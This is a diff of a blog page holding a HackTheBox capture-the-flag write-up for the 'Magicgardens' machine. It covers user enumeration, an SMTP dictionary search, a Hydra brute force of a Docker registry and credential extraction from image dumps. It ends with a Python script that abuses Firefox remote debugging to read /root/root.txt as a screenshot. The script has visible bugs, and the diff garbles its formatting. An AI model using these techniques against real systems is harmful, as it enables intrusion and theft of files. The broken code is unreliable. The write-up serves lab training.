@@ -48,14 +48,6 @@
 <main class="page-content" aria-label="Content">
       <div class="wrapper">
         
-  <div class="author-box">
-
-<div class="description">This is my blog, here you will find more information about me, in addition to my work on HackTheBox and some interesting apps i've developed
-</div>
-
-</div>
-
-
 <div class="post">
   <h1 class="post-title">Magicgardens-Linux-Insane</h1>
   
@@ -67,129 +59,104 @@
   <h1 id="magicgardens">Magicgardens</h1>
 
 <h1 id="1-enumeration">1. Enumeration</h1>
-
-<p>We started with port enumeration with nmap</p>
-
-<p><img src="/assets/images/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9_Untitled.png" alt="Untitled" /></p>
-
-<p>We’ve found the domain name associted, and we realized there’s a flower ecommerce, alse there are other ports like 25 or 5000 which we can explore later</p>
-
-<p><img src="/assets/images/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9_Untitled_1.png" alt="Untitled" /></p>
-
-<p>We proceed to sign up</p>
-
-<p><img src="/assets/images/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9_Untitled_2.png" alt="Untitled" /></p>
-
-<p>There is something interesting right here, is we create 2 users we will be able to discover a pattern in server response, to find that pattern we will focus on Username and Email input. We are able to enumerate all web application users as follow:</p>
-
-<table>
-  <thead>
-    <tr>
-      <th>Username</th>
-      <th>Email</th>
-      <th>Server response</th>
-    </tr>
-  </thead>
-  <tbody>
-    <tr>
-      <td>Valid username</td>
-      <td>Valid email</td>
-      <td>200</td>
-    </tr>
-    <tr>
-      <td>valid username</td>
-      <td>Invalid email</td>
-      <td>200</td>
-    </tr>
-    <tr>
-      <td>Invalid username</td>
-      <td>valid email</td>
-      <td>500</td>
-    </tr>
-    <tr>
-      <td>Invalid username</td>
-      <td>Invalid email</td>
-      <td>200</td>
-    </tr>
-  </tbody>
-</table>
-
-<p><img src="/assets/images/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9_Untitled_3.png" alt="Untitled" /></p>
-
-<p>To automate the enumeration we will compare different usernames with a valid email</p>
-
-<p><img src="/assets/images/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9_Untitled_4.png" alt="Untitled" /></p>
-
-<p><img src="/assets/images/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9_Untitled_5.png" alt="Untitled" /></p>
-
+<p><br /><br />
+We started with port enumeration with nmap
+<br /><br />
+<img src="/assets/images/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9_Untitled.png" alt="Untitled" />
+<br /><br />
+We’ve found the domain name associted, and we realized there’s a flower ecommerce, alse there are other ports like 25 or 5000 which we can explore later<br />
+<br /><br />
+<img src="/assets/images/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9_Untitled_1.png" alt="Untitled" />
+<br /><br />
+We proceed to sign up 
+<br /><br />
+<img src="/assets/images/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9_Untitled_2.png" alt="Untitled" />
+<br /><br />
+There is something interesting right here, is we create 2 users we will be able to discover a pattern in server response, to find that pattern we will focus on Username and Email input. We are able to enumerate all web application users as follow:
+<br /><br />
+| Username | Email | Server response |
+| — | — | — |
+| Valid username | Valid email | 200 |
+| valid username | Invalid email | 200 |
+| Invalid username | valid email | 500 |
+| Invalid username | Invalid email | 200 |
+<br /><br />
+<img src="/assets/images/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9_Untitled_3.png" alt="Untitled" />
+<br /><br />
+To automate the enumeration we will compare different usernames with a valid email
+<br /><br />
+<img src="/assets/images/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9_Untitled_4.png" alt="Untitled" />
+<br /><br />
+<img src="/assets/images/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9_Untitled_5.png" alt="Untitled" />
+<br /><br /></p>
 <h1 id="2-user-flag">2. User flag</h1>
-
-<p>Unfortunately we didn’t find any username so we continue user enumeration, we found some directories</p>
-
-<p><img src="/assets/images/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9_Untitled_6.png" alt="Untitled" /></p>
-
-<p>A login page could be useful</p>
-
-<p><img src="/assets/images/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9_Untitled_7.png" alt="Untitled" /></p>
-
-<p>We haven’t forget other ports, we have mailing server running, we can enumerate user’s here due to the valid commands shown in nmap scan,</p>
-
-<p><img src="/assets/images/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9_Untitled_8.png" alt="Untitled" /></p>
-
-<p>Depending of the size of the dictionary it could take so much time</p>
-
-<p><img src="/assets/images/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9_Untitled_9.png" alt="Untitled" /></p>
-
-<p>we already have a user</p>
-
-<p><img src="/assets/images/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9_Untitled_10.png" alt="Untitled" /></p>
-
-<p>Let’s enumerate web application service running on port 5000</p>
-
-<p><img src="/assets/images/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9_Untitled_11.png" alt="Untitled" /></p>
-
-<p>There are some a authentication directoty we may use the username found before</p>
-
-<p><img src="/assets/images/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9_Untitled_12.png" alt="Untitled" /></p>
-
-<p>As we known on port 5000 there is a docker https server</p>
-
-<p>Hydra</p>
-
-<p>Hydra can perform fast fictionary attacks againts mora than 50 protocolos, including <code class="language-plaintext highlighter-rouge">telnet -FTP - HTTP - HTTPS - SMB</code></p>
-
-<p><img src="/assets/images/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9_Untitled_13.png" alt="Untitled" /></p>
-
-<p>A valid password was found, and we can see there’s a some repositories there</p>
-
-<p><img src="/assets/images/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9_Untitled_14.png" alt="Untitled" /></p>
-
-<p><a href="https://github.com/Syzik/DockerRegistryGrabber">DockerRegistryGrabber</a> is a Python tool for enumerating/dumping Docker repositories without or with basic authentication.</p>
-
-<p><img src="/assets/images/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9_Untitled_15.png" alt="Untitled" /></p>
-
-<p><img src="/assets/images/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9_Untitled_16.png" alt="Untitled" /></p>
-
-<p>Environment variables? that’s useful, but first check sqlite database</p>
-
-<p><img src="/assets/images/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9_Untitled_17.png" alt="Untitled" /></p>
-
-<p>Morty credentials!!</p>
-
-<p><img src="/assets/images/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9_Untitled_18.png" alt="Untitled" /></p>
-
-<p><img src="/assets/images/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9_Untitled_19.png" alt="Untitled" /></p>
-
-<p><img src="/assets/images/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9_Untitled_20.png" alt="Untitled" /></p>
-
-<p><img src="/assets/images/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9_Untitled_21.png" alt="Untitled" /></p>
-
+<p><br /><br />
+Unfortunately we didn’t find any username so we continue user enumeration, we found some directories
+<br /><br />
+<img src="/assets/images/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9_Untitled_6.png" alt="Untitled" />
+<br /><br />
+A login page could be useful
+<br /><br />
+<img src="/assets/images/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9_Untitled_7.png" alt="Untitled" />
+<br /><br />
+We haven’t forget other ports, we have mailing server running, we can enumerate user’s here due to the valid commands shown in nmap scan, 
+<br /><br />
+<img src="/assets/images/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9_Untitled_8.png" alt="Untitled" />
+<br /><br />
+Depending of the size of the dictionary it could take so much time
+<br /><br />
+<img src="/assets/images/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9_Untitled_9.png" alt="Untitled" />
+<br /><br />
+we already have a user
+<br /><br />
+<img src="/assets/images/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9_Untitled_10.png" alt="Untitled" />
+<br /><br />
+Let’s enumerate web application service running on port 5000
+<br /><br />
+<img src="/assets/images/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9_Untitled_11.png" alt="Untitled" />
+<br /><br />
+There are some a authentication directoty we may use the username found before
+<br /><br />
+<img src="/assets/images/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9_Untitled_12.png" alt="Untitled" />
+<br /><br />
+As we known on port 5000 there is a docker https server
+<br /><br />
+Hydra
+<br /><br />
+Hydra can perform fast fictionary attacks againts mora than 50 protocolos, including <code class="language-plaintext highlighter-rouge">telnet -FTP - HTTP - HTTPS - SMB</code> <br />
+<br /><br />
+<img src="/assets/images/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9_Untitled_13.png" alt="Untitled" />
+<br /><br />
+A valid password was found, and we can see there’s a some repositories there
+<br /><br />
+<img src="/assets/images/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9_Untitled_14.png" alt="Untitled" />
+<br /><br />
+<a href="https://github.com/Syzik/DockerRegistryGrabber">DockerRegistryGrabber</a> is a Python tool for enumerating/dumping Docker repositories without or with basic authentication.
+<br /><br />
+<img src="/assets/images/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9_Untitled_15.png" alt="Untitled" />
+<br /><br />
+<img src="/assets/images/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9_Untitled_16.png" alt="Untitled" />
+<br /><br />
+Environment variables? that’s useful, but first check sqlite database
+<br /><br />
+<img src="/assets/images/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9_Untitled_17.png" alt="Untitled" />
+<br /><br />
+Morty credentials!!
+<br /><br />
+<img src="/assets/images/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9_Untitled_18.png" alt="Untitled" />
+<br /><br />
+<img src="/assets/images/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9_Untitled_19.png" alt="Untitled" />
+<br /><br />
+<img src="/assets/images/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9_Untitled_20.png" alt="Untitled" />
+<br /><br />
+<img src="/assets/images/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9_Untitled_21.png" alt="Untitled" />
+<br /><br /></p>
 <h1 id="3priv-esc">3.Priv esc</h1>
-
-<p>Use linpeas to enumerate the whole system</p>
-
-<p><img src="/assets/images/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9_Untitled_22.png" alt="Untitled" /></p>
-
+<p><br /><br />
+Use linpeas to enumerate the whole system
+<br /><br />
+<img src="/assets/images/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9_Untitled_22.png" alt="Untitled" />
+<br /><br /></p>
 <ul>
   <li><strong>firefox-esr</strong> This is the executable for Firefox Entended Support Release, which is stable version of Firefox that is update less frequently.</li>
   <li><strong>—marionette</strong> This enables marionette protocol, which is an automation protocol for Firefox. Marionette allows controlling and automating interaction with Firefoz via remote client.</li>
@@ -197,120 +164,126 @@
   <li><em>*—remote-debugginport</em> This specifies the port which Firefox will listen for remote debugging requests. This is used when working with development tools that need to access the firefox instance for debugging or inspecting the loaded web page.</li>
   <li><strong>—remote-allow-host</strong> This allow remote connections only from the <a href="http://localhost">localhost</a> (port forwarding needed)</li>
   <li><strong>—no-remote</strong> This option specifies that no additional remote connections will be allowed.</li>
-  <li><strong>—profile /tmp/profile</strong> This specifies the user profile that Firefox will use when starting.</li>
+  <li><strong>—profile /tmp/profile</strong> This specifies the user profile that Firefox will use when starting.
+<br /><br />
+<img src="/assets/images/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9_Untitled_23.png" alt="Untitled" />
+<br /><br />
+<img src="/assets/images/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9_Untitled_24.png" alt="Untitled" />
+<br /><br />
+<img src="/assets/images/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9_Untitled_25.png" alt="Untitled" />
+<br /><br />
+With this information we will be able to run Firefox as debugger so with the following expoilt we cloud be able to find any file we want and take and screenshot of the open file
+<br /><br />
+In python
+<br /><br />
+```python
+import json
+import requests 
+import websocket
+import base64</li>
 </ul>
 
-<p><img src="/assets/images/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9_Untitled_23.png" alt="Untitled" /></p>
+<p>#Debugger address
+debugger_address = ‘http://localhost:52735’</p>
 
-<p><img src="/assets/images/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9_Untitled_24.png" alt="Untitled" /></p>
+<p>#Perform a http request to get open windows on the browser
+response = request.get(f’{debugger_address}/json’)</p>
 
-<p><img src="/assets/images/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9_Untitled_25.png" alt="Untitled" /></p>
+<p>#Analyze JSON answer to obtain information about windows
+tabs = response.json()</p>
 
-<p>With this information we will be able to run Firefox as debugger so with the following expoilt we cloud be able to find any file we want and take and screenshot of the open file</p>
+<p>#Get the websocket debugger url of the first window and replace 
+#’127.0.0.1’ to ‘localhost’
+web_socket_debugger_url = tabs[0][‘webSocketDebuggerUrl’].replace(‘127.0.0.1’,’localhost’)
+print(f’Connect to url: {web_socket_debugger_url}’)</p>
 
-<p>In python</p>
+<p>#Establishing connection 
+ws = websocket.create_connection(web_socket_debugger_url, supress_origin=True)</p>
 
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">json</span>
-<span class="kn">import</span> <span class="nn">requests</span> 
-<span class="kn">import</span> <span class="nn">websocket</span>
-<span class="kn">import</span> <span class="nn">base64</span>
-
-<span class="c1">#Debugger address
-</span><span class="n">debugger_address</span> <span class="o">=</span> <span class="s">'http://localhost:52735'</span>
-
-<span class="c1">#Perform a http request to get open windows on the browser
-</span><span class="n">response</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="sa">f</span><span class="s">'</span><span class="si">{</span><span class="n">debugger_address</span><span class="si">}</span><span class="s">/json'</span><span class="p">)</span>
-
-<span class="c1">#Analyze JSON answer to obtain information about windows
-</span><span class="n">tabs</span> <span class="o">=</span> <span class="n">response</span><span class="p">.</span><span class="n">json</span><span class="p">()</span>
-
-<span class="c1">#Get the websocket debugger url of the first window and replace 
-#'127.0.0.1' to 'localhost'
-</span><span class="n">web_socket_debugger_url</span> <span class="o">=</span> <span class="n">tabs</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="s">'webSocketDebuggerUrl'</span><span class="p">].</span><span class="n">replace</span><span class="p">(</span><span class="s">'127.0.0.1'</span><span class="p">,</span><span class="s">'localhost'</span><span class="p">)</span>
-<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">'Connect to url: </span><span class="si">{</span><span class="n">web_socket_debugger_url</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>
-
-<span class="c1">#Establishing connection 
-</span><span class="n">ws</span> <span class="o">=</span> <span class="n">websocket</span><span class="p">.</span><span class="n">create_connection</span><span class="p">(</span><span class="n">web_socket_debugger_url</span><span class="p">,</span> <span class="n">supress_origin</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
-
-<span class="c1">#Preparing JSON command to create a new  (target) in the browser
+<p>#Preparing JSON command to create a new  (target) in the browser
 #Pointing a local file
-</span><span class="n">command</span> <span class="o">=</span> <span class="n">json</span><span class="p">.</span><span class="n">dumps</span><span class="p">({</span>
-	<span class="s">"id"</span><span class="p">:</span> <span class="mi">5</span><span class="p">,</span>
-	<span class="s">"method"</span><span class="p">:</span> <span class="s">"Target.createTarget"</span><span class="p">,</span>
-	<span class="s">"params"</span><span class="p">:{</span>
-		<span class="s">"url"</span><span class="p">:</span><span class="s">"file:///root/root.txt"</span>
-	<span class="p">}</span>
-<span class="p">})</span>
+command = json.dumps({
+	“id”: 5,
+	“method”: “Target.createTarget”,
+	“params”:{
+		“url”:”file:///root/root.txt”
+	}
+})</p>
 
-<span class="c1">#Send the object to create the target
-</span><span class="n">ws</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">command</span><span class="p">)</span>
+<p>#Send the object to create the target
+ws.send(command)</p>
 
-<span class="c1">#Receive the answer from websocket and extracts ID of the target
-</span><span class="n">target_id</span> <span class="o">=</span> <span class="n">json</span><span class="p">.</span><span class="n">loads</span><span class="p">(</span><span class="n">ws</span><span class="p">.</span><span class="n">recv</span><span class="p">())[</span><span class="s">'result'</span><span class="p">][</span><span class="s">'targetId'</span><span class="p">]</span>
-<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">'target id": </span><span class="si">{</span><span class="n">target_id</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>
+<p>#Receive the answer from websocket and extracts ID of the target
+target_id = json.loads(ws.recv())[‘result’][‘targetId’]
+print(f’target id”: {target_id}’)</p>
 
-<span class="c1">#Prepare the JSON command to attach the target using its ID
-</span><span class="n">command</span> <span class="o">=</span> <span class="n">json</span><span class="p">.</span><span class="n">dumps</span><span class="p">({</span>
-	<span class="s">"id"</span><span class="p">:</span><span class="mi">5</span><span class="p">,</span>
-	<span class="s">"method"</span><span class="p">:</span> <span class="s">"Target.attachToTarget"</span><span class="p">,</span>
-	<span class="s">"params"</span><span class="p">:{</span>
-		<span class="s">"targetId"</span><span class="p">:</span> <span class="n">target_id</span><span class="p">,</span>
-		<span class="s">"flatten"</span><span class="p">:</span> <span class="bp">True</span>
-		
-	<span class="p">}</span>
-<span class="p">})</span>
+<p>#Prepare the JSON command to attach the target using its ID
+command = json.dumps({
+	“id”:5,
+	“method”: “Target.attachToTarget”,
+	“params”:{
+		“targetId”: target_id,
+		“flatten”: True</p>
 
-<span class="c1">#Send the command
-</span><span class="n">ws</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">command</span><span class="p">)</span>
-
-<span class="c1">#Gets the answer and extracts ID session attached
-</span><span class="n">session_id</span> <span class="o">=</span> <span class="n">json</span><span class="p">.</span><span class="n">loads</span><span class="p">(</span><span class="n">ws</span><span class="p">.</span><span class="n">recv</span><span class="p">())[</span><span class="s">'params'</span><span class="p">][</span><span class="s">'sessionId'</span><span class="p">]</span>
-<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">'Session id: </span><span class="si">{</span><span class="n">session_id</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>
-
-<span class="c1">#prepare the command to take a screenshot
-</span>
-<span class="n">command</span> <span class="o">=</span> <span class="n">json</span><span class="p">.</span><span class="n">dumps</span><span class="p">({</span>
-	<span class="s">"id"</span><span class="p">:</span><span class="mi">5</span><span class="p">,</span>
-	<span class="s">"sessionId"</span> <span class="n">session_id</span><span class="p">,</span>
-	<span class="s">"method"</span><span class="p">:</span> <span class="s">"Page.captureScreenshot"</span><span class="p">,</span>
-	<span class="s">"params"</span><span class="p">:</span> <span class="p">{</span>
-		<span class="s">"sessionId"</span><span class="p">:</span> <span class="n">session_id</span><span class="p">,</span>
-		<span class="s">"format"</span><span class="p">:</span><span class="s">"png"</span>
-	<span class="p">}</span>
-<span class="p">})</span>
-
-<span class="c1">#Send the command
-</span><span class="n">ws</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">command</span><span class="p">)</span>
-
-<span class="c1">#Gets the answer which contains the screenshot in base64
-</span><span class="n">result</span> <span class="o">=</span> <span class="n">json</span><span class="p">.</span><span class="n">loads</span><span class="p">(</span><span class="n">ws</span><span class="p">.</span><span class="n">recv</span><span class="p">())</span>
-
-<span class="c1">#Send the command again it seems to be neccesary
-</span><span class="n">ws</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">command</span><span class="p">)</span>
-<span class="c1">#Loads the screenshot
-</span><span class="n">result</span> <span class="o">=</span> <span class="n">json</span><span class="p">.</span><span class="n">loads</span><span class="p">(</span><span class="n">ws</span><span class="p">())</span>
-
-<span class="c1">#Verify if the screenshot was successfull
-</span><span class="k">if</span> <span class="s">'result'</span> <span class="ow">in</span> <span class="n">result</span> <span class="ow">and</span> <span class="s">'data'</span> <span class="ow">in</span> <span class="n">result</span><span class="p">[</span><span class="s">'result'</span><span class="p">]:</span>
-	<span class="k">print</span><span class="p">(</span><span class="s">"Success file reading"</span><span class="p">)</span>
-	<span class="c1">#If it is succesfull decode and save the file
-</span>	<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">"root.png"</span><span class="p">,</span> <span class="s">"wb"</span><span class="p">)</span> <span class="k">as</span> <span class="nb">file</span><span class="p">:</span>
-		<span class="nb">file</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">base64</span><span class="p">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">result</span><span class="p">[</span><span class="s">'result'</span><span class="p">][</span><span class="s">'data'</span><span class="p">]))</span>
-<span class="k">else</span><span class="p">:</span> 
-	<span class="k">print</span><span class="p">(</span><span class="s">"Error"</span><span class="p">)</span>
-	
-<span class="n">ws</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>} })
 </code></pre></div></div>
 
-<p>In bash</p>
+<p>#Send the command
+ws.send(command)</p>
 
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<p>#Gets the answer and extracts ID session attached
+session_id = json.loads(ws.recv())[‘params’][‘sessionId’]
+print(f’Session id: {session_id}’)</p>
+
+<p>#prepare the command to take a screenshot</p>
+
+<p>command = json.dumps({
+	“id”:5,
+	“sessionId” session_id,
+	“method”: “Page.captureScreenshot”,
+	“params”: {
+		“sessionId”: session_id,
+		“format”:”png”
+	}
+})</p>
+
+<p>#Send the command
+ws.send(command)</p>
+
+<p>#Gets the answer which contains the screenshot in base64
+result = json.loads(ws.recv())</p>
+
+<p>#Send the command again it seems to be neccesary
+ws.send(command)
+#Loads the screenshot
+result = json.loads(ws())</p>
+
+<p>#Verify if the screenshot was successfull
+if ‘result’ in result and ‘data’ in result[‘result’]:
+	print(“Success file reading”)
+	#If it is succesfull decode and save the file
+	with open(“root.png”, “wb”) as file:
+		file.write(base64.b64decode(result[‘result’][‘data’]))
+else: 
+	print(“Error”)</p>
+
+<p>ws.close()</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;br/&gt;&lt;br/&gt;
+In bash
+&lt;br/&gt;&lt;br/&gt;
+```bash
+
 </code></pre></div></div>
-
